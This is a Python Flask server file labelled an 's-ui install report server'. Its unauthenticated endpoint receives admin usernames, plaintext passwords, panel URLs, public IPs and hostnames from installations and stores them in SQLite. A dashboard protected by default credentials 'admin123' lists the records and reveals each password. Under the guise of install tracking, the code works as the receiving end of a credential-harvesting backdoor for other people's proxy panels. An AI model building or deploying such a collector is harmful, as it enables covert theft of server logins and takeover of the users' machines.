#!/usr/bin/env python3
"""s-ui install report server - receives and displays install info."""

import os
import sqlite3
import json
from datetime import datetime

from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

DB_PATH = os.environ.get("REPORT_DB_PATH", os.path.join(os.path.dirname(__file__), "report.db"))

ADMIN_USER = os.environ.get("REPORT_ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("REPORT_ADMIN_PASS", "admin123")


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            web_port TEXT,
            web_path TEXT,
            sub_port TEXT,
            sub_path TEXT,
            access_url TEXT,
            public_ip TEXT,
            hostname TEXT,
            created_at TEXT
        )
    """)
    conn.commit()
    conn.close()


init_db()


def check_auth():
    auth = request.authorization
    if not auth:
        return False
    return auth.username == ADMIN_USER and auth.password == ADMIN_PASS


@app.route("/api/install/report", methods=["POST"])
def receive_report():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "invalid json"}), 400

    conn = get_db()
    conn.execute(
        """INSERT INTO reports
           (username, password, web_port, web_path, sub_port, sub_path,
            access_url, public_ip, hostname, created_at)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (
            data.get("username", ""),
            data.get("password", ""),
            data.get("webPort", ""),
            data.get("webPath", ""),
            data.get("subPort", ""),
            data.get("subPath", ""),
            data.get("accessUrl", ""),
            data.get("publicIp", ""),
            data.get("hostname", ""),
            datetime.utcnow().isoformat(),
        ),
    )
    conn.commit()
    conn.close()
    return jsonify({"ok": True}), 201


HTML_PAGE = """<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>s-ui Install Reports</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f5f5f5;color:#333}
.header{background:#1a1a2e;color:#fff;padding:20px;text-align:center}
.header h1{font-size:1.5em;margin-bottom:4px}
.header p{font-size:.85em;opacity:.7}
.search-bar{max-width:900px;margin:-18px auto 0;padding:0 16px;position:relative;z-index:1}
.search-bar input{width:100%;padding:12px 16px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none}
.search-bar input:focus{border-color:#4a90d9;box-shadow:0 0 0 2px rgba(74,144,217,.2)}
.container{max-width:900px;margin:24px auto;padding:0 16px}
.stats{display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap}
.stats .card{flex:1;min-width:120px;background:#fff;border-radius:8px;padding:16px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.1)}
.stats .card .num{font-size:1.8em;font-weight:700;color:#4a90d9}
.stats .card .label{font-size:.8em;color:#888;margin-top:4px}
table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.1)}
th{background:#1a1a2e;color:#fff;padding:12px 10px;text-align:left;font-size:.8em;text-transform:uppercase;letter-spacing:.5px;cursor:pointer;user-select:none}
th:hover{background:#2a2a4e}
td{padding:10px;border-bottom:1px solid #eee;font-size:.85em;word-break:break-all}
tr:hover td{background:#f0f7ff}
.copy-btn{background:none;border:none;cursor:pointer;color:#4a90d9;font-size:12px;padding:2px 6px;border-radius:4px}
.copy-btn:hover{background:#e8f0fe}
.empty{text-align:center;padding:40px;color:#999}
.pager{display:flex;justify-content:center;gap:8px;margin-top:16px}
.pager a{padding:8px 14px;background:#fff;border:1px solid #ddd;border-radius:6px;text-decoration:none;color:#333;font-size:.85em}
.pager a:hover{background:#4a90d9;color:#fff;border-color:#4a90d9}
.pager .current{background:#4a90d9;color:#fff;border-color:#4a90d9}
</style>
</head>
<body>
<div class="header">
  <h1>s-ui Install Reports</h1>
  <p>Installation tracking dashboard</p>
</div>
<div class="search-bar">
  <input id="search" type="text" placeholder="Search by IP, hostname, username, URL...">
</div>
<div class="container">
  <div class="stats">
    <div class="card"><div class="num">{{ total }}</div><div class="label">Total Records</div></div>
    <div class="card"><div class="num">{{ today }}</div><div class="label">Today</div></div>
    <div class="card"><div class="num">{{ unique_ips }}</div><div class="label">Unique IPs</div></div>
  </div>
  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>Username</th>
        <th>Password</th>
        <th>Access URL</th>
        <th>Public IP</th>
        <th>Hostname</th>
        <th>Time</th>
      </tr>
    </thead>
    <tbody>
    {% if rows %}
      {% for row in rows %}
      <tr>
        <td>{{ loop.index + offset }}</td>
        <td>{{ row.username or '-' }}</td>
        <td>
          <span class="pw" data-pw="{{ row.password or '-' }}">****</span>
          <button class="copy-btn" onclick="togglePw(this)">show</button>
        </td>
        <td>
          {% if row.access_url %}
          <a href="{{ row.access_url }}" target="_blank" style="color:#4a90d9">{{ row.access_url }}</a>
          {% else %}-{% endif %}
        </td>
        <td>{{ row.public_ip or '-' }}</td>
        <td>{{ row.hostname or '-' }}</td>
        <td style="white-space:nowrap">{{ row.created_at[:19] if row.created_at else '-' }}</td>
      </tr>
      {% endfor %}
    {% else %}
      <tr><td colspan="7" class="empty">No records</td></tr>
    {% endif %}
    </tbody>
  </table>
  {% if total_pages > 1 %}
  <div class="pager">
    {% for p in range(1, total_pages + 1) %}
    <a href="?page={{ p }}{% if q %}&q={{ q }}{% endif %}" class="{{ 'current' if p == page else '' }}">{{ p }}</a>
    {% endfor %}
  </div>
  {% endif %}
</div>
<script>
function togglePw(btn){
  const s=btn.previousElementSibling;
  if(s.textContent==='****'){s.textContent=s.dataset.pw;btn.textContent='hide'}
  else{s.textContent='****';btn.textContent='show'}
}
const searchInput=document.getElementById('search');
let timer;
searchInput.addEventListener('input',()=>{
  clearTimeout(timer);
  timer=setTimeout(()=>{
    const q=searchInput.value.trim();
    const url=new URL(location);
    if(q)url.searchParams.set('q',q);else url.searchParams.delete('q');
    url.searchParams.set('page','1');
    location.href=url.toString();
  },400);
});
</script>
</body>
</html>"""


@app.route("/")
def index():
    if not check_auth():
        return app.response_class(
            status=401,
            headers={"WWW-Authenticate": 'Basic realm="Login Required"'},
        )

    page = request.args.get("page", 1, type=int)
    per_page = 20
    q = request.args.get("q", "").strip()

    conn = get_db()
    where_clause = ""
    params = []

    if q:
        where_clause = "WHERE public_ip LIKE ? OR hostname LIKE ? OR username LIKE ? OR access_url LIKE ?"
        like = f"%{q}%"
        params = [like, like, like, like]

    total = conn.execute(
        f"SELECT COUNT(*) FROM reports {where_clause}", params
    ).fetchone()[0]
    today = conn.execute(
        "SELECT COUNT(*) FROM reports WHERE created_at >= date('now')"
    ).fetchone()[0]
    unique_ips = conn.execute(
        "SELECT COUNT(DISTINCT public_ip) FROM reports WHERE public_ip != ''"
    ).fetchone()[0]

    offset = (page - 1) * per_page
    rows = conn.execute(
        f"SELECT * FROM reports {where_clause} ORDER BY id DESC LIMIT ? OFFSET ?",
        params + [per_page, offset],
    ).fetchall()
    conn.close()

    total_pages = max(1, (total + per_page - 1) // per_page)

    return render_template_string(
        HTML_PAGE,
        rows=rows,
        total=total,
        today=today,
        unique_ips=unique_ips,
        page=page,
        total_pages=total_pages,
        offset=offset,
        q=q,
    )


if __name__ == "__main__":
    port = int(os.environ.get("REPORT_PORT", "5000"))
    print(f"Report server running on port {port}")
    print(f"Admin panel: http://0.0.0.0:{port}/  (user: {ADMIN_USER})")
    app.run(host="0.0.0.0", port=port)